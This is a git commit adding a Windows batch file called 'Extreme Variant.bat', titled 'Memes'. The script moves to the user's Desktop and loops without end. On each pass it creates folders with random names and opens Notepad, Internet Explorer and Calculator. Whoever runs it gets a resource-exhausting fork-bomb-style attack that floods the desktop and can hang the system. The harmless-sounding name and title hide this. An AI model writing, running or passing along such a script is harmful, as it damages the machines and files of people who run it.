1b8e14ec4569a281d4f946edcc473d51e07a13d9
ByteGig <gig-a-byte@cyberservices.com>
2018-02-05 16:45:09 +1100

    Create Extreme Variant.bat

---
+++ Extreme Variant.bat
@@ -0,0 +1,13 @@
+@echo off
+title Memes
+color 00
+C:
+cd %userprofile%/Desktop
+:start
+mkdir %random%
+mkdir %random%%random%
+mkdir %random%%random%%random%
+start notepad.exe
+start iexplore.exe
+start calc.exe
+goto start
